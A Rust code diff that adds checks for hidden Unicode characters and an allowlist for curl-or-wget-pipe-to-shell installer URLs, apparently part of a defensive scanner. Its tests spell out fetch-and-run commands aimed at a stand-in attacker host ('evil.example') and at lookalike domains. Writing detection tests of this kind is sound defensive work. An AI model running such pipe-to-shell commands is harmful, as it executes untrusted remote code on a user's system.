@@ -315,24 +315,174 @@ pub fn line_is_hidden_markup(text: &str, line: i64) -> bool {
     false
 }
 
+fn is_invisible_codepoint(u: u32) -> bool {
+    matches!(
+        u,
+        0x200B | 0x200C | 0x200D | 0x2060 | 0xFEFF
+            | 0x202A..=0x202E
+            | 0x2066..=0x2069
+            | 0xE0000..=0xE007F
+    )
+}
+
+fn is_emoji_base(c: char) -> bool {
+    let u = c as u32;
+    (0x1F300..=0x1FAFF).contains(&u) || (0x2600..=0x27BF).contains(&u)
+}
+
+fn is_variation_selector(c: char) -> bool {
+    c as u32 == 0xFE0F
+}
+
+fn nearest_non_vs_left(chars: &[char], idx: usize) -> Option<char> {
+    let mut i = idx;
+    while i > 0 {
+        i -= 1;
+        if !is_variation_selector(chars[i]) {
+            return Some(chars[i]);
+        }
+    }
+    None
+}
+
+fn nearest_non_vs_right(chars: &[char], idx: usize) -> Option<char> {
+    let mut i = idx + 1;
+    while i < chars.len() {
+        if !is_variation_selector(chars[i]) {
+            return Some(chars[i]);
+        }
+        i += 1;
+    }
+    None
+}
+
+fn zwj_is_emoji_joiner(chars: &[char], zwj_idx: usize) -> bool {
+    match (
+        nearest_non_vs_left(chars, zwj_idx),
+        nearest_non_vs_right(chars, zwj_idx),
+    ) {
+        (Some(l), Some(r)) => is_emoji_base(l) && is_emoji_base(r),
+        _ => false,
+    }
+}
+
+fn is_ascii_ident(c: char) -> bool {
+    c.is_ascii_alphanumeric() || c == '_'
+}
+
+fn zwj_between_ascii_idents(chars: &[char], zwj_idx: usize) -> bool {
+    matches!(
+        (
+            nearest_non_vs_left(chars, zwj_idx),
+            nearest_non_vs_right(chars, zwj_idx)
+        ),
+        (Some(l), Some(r)) if is_ascii_ident(l) && is_ascii_ident(r)
+    )
+}
+
+/// Allow line when every U+200D is an emoji joiner or isolated prose (single ZWJ).
+fn line_zwj_allowed(line: &str) -> bool {
+    let chars: Vec<char> = line.chars().collect();
+    let zwj_indices: Vec<usize> = chars
+        .iter()
+        .enumerate()
+        .filter(|(_, c)| (**c as u32) == 0x200D)
+        .map(|(i, _)| i)
+        .collect();
+    if zwj_indices.is_empty() {
+        return true;
+    }
+    if zwj_indices.len() == 1 {
+        let idx = zwj_indices[0];
+        return zwj_is_emoji_joiner(&chars, idx) || !zwj_between_ascii_idents(&chars, idx);
+    }
+    zwj_indices
+        .iter()
+        .all(|&idx| zwj_is_emoji_joiner(&chars, idx))
+}
+
 /// First line with invisible / bidi / tag-block Unicode, or 0.
 pub fn find_invisible_line(text: &str) -> i64 {
     for (idx, line) in text.lines().enumerate() {
+        let mut saw_zwj = false;
+        let mut other_invisible = false;
         for ch in line.chars() {
             let u = ch as u32;
-            let invisible = matches!(
-                u,
-                0x200B | 0x200C | 0x200D | 0x2060 | 0xFEFF // ZW*, WJ, BOM
-                | 0x202A..=0x202E // bidi embeds/overrides
-                | 0x2066..=0x2069 // bidi isolates
-                | 0xE0000..=0xE007F // tags
-            );
-            if invisible {
-                return (idx as i64) + 1;
+            if !is_invisible_codepoint(u) {
+                continue;
             }
+            if u == 0x200D {
+                saw_zwj = true;
+            } else {
+                other_invisible = true;
+                break;
+            }
+        }
+        if other_invisible {
+            return (idx as i64) + 1;
+        }
+        if saw_zwj && !line_zwj_allowed(line) {
+            return (idx as i64) + 1;
         }
     }
     0
+}
+
+fn trim_url_trailing_punct(url: &str) -> String {
+    let mut s = url.to_string();
+    while let Some(last) = s.chars().last() {
+        if matches!(last, ')' | ']' | '}' | ',' | ';' | '"' | '\'') {
+            s.pop();
+        } else {
+            break;
+        }
+    }
+    s
+}
+
+fn extract_http_urls(line: &str) -> Vec<String> {
+    let Ok(re) = Regex::new(r#"(?i)https?://[^\s'"<>]+"#) else {
+        return Vec::new();
+    };
+    re.find_iter(line)
+        .map(|m| trim_url_trailing_punct(m.as_str()))
+        .collect()
+}
+
+fn parse_https_host_path(url: &str) -> Option<(String, String)> {
+    let rest = url.strip_prefix("https://")?;
+    let (authority, path) = match rest.find('/') {
+        Some(i) => (&rest[..i], &rest[i..]),
+        None => (rest, "/"),
+    };
+    if authority.contains('@') {
+        return None;
+    }
+    let host = authority.split(':').next()?.to_ascii_lowercase();
+    Some((host, path.to_string()))
+}
+
+fn trusted_installer_url(url: &str) -> bool {
+    let Some((host, path)) = parse_https_host_path(url) else {
+        return false;
+    };
+    if path.contains("..") {
+        return false;
+    }
+    if matches!(
+        host.as_str(),
+        "sh.rustup.rs" | "rustup.rs" | "www.rustup.rs"
+    ) {
+        return true;
+    }
+    host == "github.com"
+        && path.starts_with("/axodotdev/cargo-dist/releases/download/")
+}
+
+/// True when every https URL on the line is an allowlisted installer (and there is at least one).
+pub fn pipe_line_trusted(line: &str) -> bool {
+    let urls = extract_http_urls(line);
+    !urls.is_empty() && urls.iter().all(|u| trusted_installer_url(u))
 }
 
 const MAX_HIDDEN_PAYLOADS: usize = 16;
@@ -927,6 +1077,49 @@ mod tests {
         let text = "hello\u{200b}world\n";
         assert_eq!(find_invisible_line(text), 1);
         assert_eq!(find_invisible_line("hello world\n"), 0);
+    }
+
+    #[test]
+    fn find_invisible_line_zwj_cases() {
+        assert_eq!(find_invisible_line("services\u{200d}.</p>\n"), 0);
+        assert_eq!(
+            find_invisible_line("hel\u{200d}lo\n"),
+            1,
+            "ZWJ between ASCII idents"
+        );
+        assert_eq!(find_invisible_line("plain \u{202e} text\n"), 1);
+        assert_eq!(find_invisible_line("a\u{200d} b\u{200d}c\n"), 1);
+        let emoji = "\u{1f468}\u{200d}\u{1f4bb}\n";
+        assert_eq!(find_invisible_line(emoji), 0);
+        let family = "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}\n";
+        assert_eq!(find_invisible_line(family), 0);
+    }
+
+    #[test]
+    fn pipe_line_trusted_installers() {
+        assert!(pipe_line_trusted(
+            "curl https://sh.rustup.rs -sSf | sh -s -- -y"
+        ));
+        assert!(pipe_line_trusted("wget -qO- https://sh.rustup.rs | bash"));
+        assert!(pipe_line_trusted(
+            "curl https://github.com/axodotdev/cargo-dist/releases/download/v0.31.0/cargo-dist-installer.sh | sh"
+        ));
+        assert!(!pipe_line_trusted("curl https://evil.example/x | sh"));
+        assert!(!pipe_line_trusted(
+            "curl https://sh.rustup.rs.evil.example/x | sh"
+        ));
+        assert!(!pipe_line_trusted("curl https://evil.example/sh.rustup.rs | sh"));
+        assert!(!pipe_line_trusted(
+            "curl https://sh.rustup.rs https://evil.example/x | sh"
+        ));
+        assert!(!pipe_line_trusted(
+            "curl https://github.com/axodotdev/cargo-dist/releases/latest/download/cargo-dist-installer.sh | sh"
+        ));
+        assert!(!pipe_line_trusted(
+            "curl https://github.com/krakenfx/kraken-cli/releases/latest/download/kraken-cli-installer.sh | sh"
+        ));
+        assert!(!pipe_line_trusted("curl | sh"));
+        assert!(!pipe_line_trusted("curl http://sh.rustup.rs | sh"));
     }
 
     #[test]
